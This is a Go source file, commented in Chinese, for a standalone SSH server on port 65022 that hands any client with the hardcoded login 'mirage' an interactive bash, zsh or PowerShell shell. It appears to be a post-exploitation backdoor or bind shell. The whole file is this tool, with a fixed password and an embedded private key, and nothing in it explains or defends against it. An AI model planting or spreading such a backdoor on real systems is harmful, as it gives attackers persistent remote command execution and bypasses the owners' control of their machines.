package main

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"net"
	"os/exec"
	"runtime"
)

// 用户名和密码
const (
	sshUser     = "mirage"
	sshPassword = "Mirage_so_cool!"
)

// 服务端私钥
const serverPrivateKey = `-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----`

func main() {
	// 解析服务端私钥
	privateKey, err := ssh.ParsePrivateKey([]byte(serverPrivateKey))
	if err != nil {
		log.Fatalf("[-] Failed to parse private key: %v", err)
	}

	// 配置 SSH 服务
	config := &ssh.ServerConfig{
		PasswordCallback: func(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
			if conn.User() == sshUser && string(password) == sshPassword {
				return nil, nil
			}
			return nil, fmt.Errorf("[-] invalid username or password")
		},
	}
	config.AddHostKey(privateKey)

	// 启动监听
	listener, err := net.Listen("tcp", "0.0.0.0:65022")
	if err != nil {
		log.Fatalf("[-] Failed to listen on 0.0.0.0:65022: %v", err)
	}
	defer listener.Close()
	log.Println("[+] SSH server is running on 0.0.0.0:65022")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("[-] Failed to accept incoming connection: %v", err)
			continue
		}
		go handleConnection(conn, config)
	}
}

func handleConnection(conn net.Conn, config *ssh.ServerConfig) {
	sshConn, chans, reqs, err := ssh.NewServerConn(conn, config)
	if err != nil {
		log.Printf("[-] Failed to handshake: %v", err)
		return
	}
	defer sshConn.Close()

	log.Printf("[+] New SSH connection from %s (%s)", sshConn.RemoteAddr(), sshConn.ClientVersion())

	// 处理全局请求
	go ssh.DiscardRequests(reqs)

	// 处理通道请求
	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unsupported channel type")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			log.Printf("[-] Could not accept channel: %v", err)
			continue
		}

		go handleChannel(channel, requests)
	}
}

func handleChannel(channel ssh.Channel, requests <-chan *ssh.Request) {
	defer channel.Close()

	for req := range requests {
		switch req.Type {
		case "pty-req":
			req.Reply(true, nil)
		case "shell":
			req.Reply(true, nil)
			runShell(channel)
		default:
			req.Reply(false, nil)
		}
	}
}

func runShell(channel ssh.Channel) {
	defer channel.Close()

	cmd := exec.Command("bash")
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/c", "start", "/b", "powershell")
	case "linux":
		cmd = exec.Command("bash")
	default:
		cmd = exec.Command("zsh")
	}
	cmd.Stdin = channel
	cmd.Stdout = channel
	cmd.Stderr = channel

	if err := cmd.Run(); err != nil {
		log.Printf("[-] Failed to run shell: %v", err)
	}
}
